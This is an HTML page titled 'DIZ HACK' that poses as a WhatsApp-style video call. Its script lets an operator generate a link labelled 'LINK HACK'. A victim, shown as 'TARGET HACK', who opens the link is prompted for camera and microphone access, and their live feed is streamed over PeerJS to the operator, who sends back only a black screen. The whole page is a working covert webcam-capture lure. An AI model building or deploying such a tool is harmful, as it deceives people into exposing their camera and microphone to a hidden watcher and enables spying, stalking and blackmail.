<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <title>DIZ HACK</title>
  <link href="https://fonts.googleapis.com/css?family=Roboto:400,500,700&display=swap" rel="stylesheet">
  <style>
    * { box-sizing: border-box; margin: 0; padding: 0; }
    body { font-family: 'Roboto', sans-serif; background-color: #ece5dd; }
    .wrapper {
      width: 100%;
      max-width: 480px;
      height: 90vh;
      background: #fff;
      border-radius: 10px;
      box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
      overflow: hidden;
      position: relative;
      resize: both;
      overflow: auto;
    }
    .header {
      background: #075e54;
      color: #fff;
      padding: 15px;
      text-align: center;
      font-size: 18px;
      font-weight: 500;
      cursor: move;
      display: flex;
      justify-content: space-between;
      align-items: center;
    }
    .header .title { flex: 1; text-align: center; }
    .toggle-size {
      background: transparent;
      border: none;
      color: #fff;
      font-size: 16px;
      cursor: pointer;
    }
    .video-container {
      flex: 1;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      gap: 10px;
      padding: 10px;
    }
    .video-wrapper {
      width: 450%;
      max-width: 400px;
      display: flex;
      flex-direction: column;
      align-items: center;
    }
    video {
      width: 110%;
      border-radius: 10px;
      background: #000;
      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.3);
    }
    .video-label {
      margin-top: 5px;
      font-size: 16px;
      font-weight: bold;
      color: #333;
    }
    .controls {
      padding: 15px;
      background: #f8f9fa;
      border-top: 1px solid #ddd;
      text-align: center;
    }
    .btn {
      padding: 12px 24px;
      border: none;
      border-radius: 50px;
      font-size: 16px;
      cursor: pointer;
      transition: background 0.3s, transform 0.3s;
      margin: 5px;
    }
    .btn-start { background: #25D366; color: #fff; }
    .btn-start:hover { background: #1ebe5a; transform: scale(1.03); }
    .btn-end { background: #d32f2f; color: #fff; }
    .btn-end:hover { background: #b71c1c; transform: scale(1.03); }
    .btn-copy { background: #075e54; color: #fff; }
    .btn-copy:hover { background: #064d47; transform: scale(1.03); }
    .link-container {
      display: flex;
      align-items: center;
      gap: 10px;
      margin-top: 10px;
    }
    .link-input {
      flex: 1;
      padding: 10px;
      border: 1px solid #ccc;
      border-radius: 25px;
      font-size: 14px;
      outline: none;
    }
    .content { display: flex; flex-direction: column; height: 100%; }
  </style>
</head>
<body>
<div class="wrapper" id="draggable">
  <div class="header" id="dragHeader">
    <span class="title">Video Call</span>
    <button class="toggle-size" id="toggleSizeBtn">Enlarge</button>
  </div>
  <div class="content">
    <div class="video-container">
      <div class="video-wrapper">
        <video id="localVideo" autoplay muted playsinline></video>
        <div class="video-label">DIZ FLYZE</div>
      </div>
      <div class="video-wrapper">
        <video id="remoteVideo" autoplay playsinline></video>
        <div class="video-label">TARGET HACK</div>
      </div>
    </div>
    <div class="controls">
      <button id="startCallBtn" class="btn btn-start">HACK</button>
      <button id="endCallBtn" class="btn btn-end" style="display:none;">CLOSED</button>
      <div class="link-container">
        <input type="text" id="callLink" class="link-input" readonly placeholder="LINK HACK">
        <button id="copyLinkBtn" class="btn btn-copy">Copy</button>
      </div>
    </div>
  </div>
</div>
<script src="https://unpkg.com/peerjs@1.4.7/dist/peerjs.min.js"></script>
<script>
  function getQueryParam(param){const params=new URLSearchParams(window.location.search);return params.get(param);}
  let peer=null, localStream=null, currentCall=null, isEnlarged=false, originalStyle={};
  function createBlackStream(width=320,height=240,fps=30){const canvas=document.createElement('canvas');canvas.width=width;canvas.height=height;const ctx=canvas.getContext('2d');ctx.fillStyle='black';ctx.fillRect(0,0,width,height);return canvas.captureStream(fps);}
  function initAdmin(){
    document.getElementById('startCallBtn').style.display='none';
    document.getElementById('endCallBtn').style.display='inline-block';
    peer=new Peer();
    peer.on('open',function(id){document.getElementById('callLink').value=window.location.origin+window.location.pathname+'?peer='+id;});
    localStream=createBlackStream();
    document.getElementById('localVideo').srcObject=localStream;
    peer.on('call',function(call){
      currentCall=call;
      call.answer(localStream);
      call.on('stream',function(remoteStream){document.getElementById('remoteVideo').srcObject=remoteStream;});
    });
    document.getElementById('endCallBtn').addEventListener('click',function(){
      if(currentCall) currentCall.close();
      if(peer) peer.destroy();
      localStream.getTracks().forEach(track=>track.stop());
      window.location.reload();
    });
    document.getElementById('copyLinkBtn').addEventListener('click',function(){
      document.getElementById('callLink').select();
      document.execCommand('copy');
      alert('Link disalin!');
    });
  }
  function initGuest(adminId){
    document.getElementById('startCallBtn').style.display='none';
    document.getElementById('endCallBtn').style.display='inline-block';
    peer=new Peer();
    navigator.mediaDevices.getUserMedia({video:true,audio:true}).then(function(stream){
      localStream=stream;
      document.getElementById('localVideo').srcObject=localStream;
      peer.on('open',function(id){
        const call=peer.call(adminId,localStream);
        currentCall=call;
        call.on('stream',function(remoteStream){document.getElementById('remoteVideo').srcObject=remoteStream;});
      });
    }).catch(function(err){alert('Aktifkan izin kamera');});
    document.getElementById('endCallBtn').addEventListener('click',function(){
      if(currentCall) currentCall.close();
      if(peer) peer.destroy();
      localStream.getTracks().forEach(track=>track.stop());
      window.location.reload();
    });
  }
  window.addEventListener('load',function(){
    const adminPeerId=getQueryParam('peer');
    if(adminPeerId){ initGuest(adminPeerId); }
    else { document.getElementById('startCallBtn').addEventListener('click',function(){ initAdmin(); }); }
  });
  const draggable=document.getElementById('draggable');
  const dragHeader=document.getElementById('dragHeader');
  let offsetX=0, offsetY=0, isDragging=false;
  dragHeader.addEventListener('mousedown',function(e){
    isDragging=true;
    offsetX=e.clientX-draggable.getBoundingClientRect().left;
    offsetY=e.clientY-draggable.getBoundingClientRect().top;
  });
  document.addEventListener('mousemove',function(e){
    if(isDragging){
      draggable.style.position='fixed';
      draggable.style.left=(e.clientX-offsetX)+'px';
      draggable.style.top=(e.clientY-offsetY)+'px';
    }
  });
  document.addEventListener('mouseup',function(){ isDragging=false; });
  const toggleSizeBtn=document.getElementById('toggleSizeBtn');
  toggleSizeBtn.addEventListener('click',function(){
    if(!isEnlarged){
      originalStyle={ width: draggable.style.width, height: draggable.style.height, left: draggable.style.left, top: draggable.style.top, position: draggable.style.position };
      draggable.style.position='fixed';
      draggable.style.left='0';
      draggable.style.top='0';
      draggable.style.width='100vw';
      draggable.style.height='100vh';
      toggleSizeBtn.textContent='Minimize';
      isEnlarged=true;
    } else {
      draggable.style.position=originalStyle.position;
      draggable.style.width=originalStyle.width;
      draggable.style.height=originalStyle.height;
      draggable.style.left=originalStyle.left;
      draggable.style.top=originalStyle.top;
      toggleSizeBtn.textContent='Enlarge';
      isEnlarged=false;
    }
  });
</script>
</body>
  </html>
